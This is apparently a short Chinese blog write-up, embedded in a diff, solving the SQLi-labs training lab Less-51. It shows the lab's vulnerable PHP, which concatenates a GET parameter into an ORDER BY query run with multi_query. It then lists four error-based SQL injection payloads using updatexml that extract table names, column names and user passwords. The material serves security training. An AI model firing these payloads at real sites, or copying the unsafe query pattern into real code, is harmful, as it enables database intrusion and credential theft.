@@ -1,0 +1,18 @@
+<hr>
+<h2 id="title-less51url-https-www-yuque-com-u29002979-ep2zrx-dxfeaflalzgqw6gy"><a href="#title-less51url-https-www-yuque-com-u29002979-ep2zrx-dxfeaflalzgqw6gy" class="headerlink" title="title: less51url: https://www.yuque.com/u29002979/ep2zrx/dxfeaflalzgqw6gy"></a>title: less51<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/dxfeaflalzgqw6gy">https://www.yuque.com/u29002979/ep2zrx/dxfeaflalzgqw6gy</a></h2><pre><code class="bash">$id=$_GET[&#39;sort&#39;];	
+
+$sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
+/* execute multi query */
+if (mysqli_multi_query($con1, $sql)) 
+</code></pre>
+<p>此关与Less50的区别为闭合方式为单引号，字符型注入，同样存在堆叠注入</p>
+<p><a name="GxiDU"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre><code class="bash">查询数据库表
+?sort=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
+爆破数据表
+?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
+爆破字段名
+?sort=1&#39; and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) -- +
+爆破字段
+?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
+</code></pre>
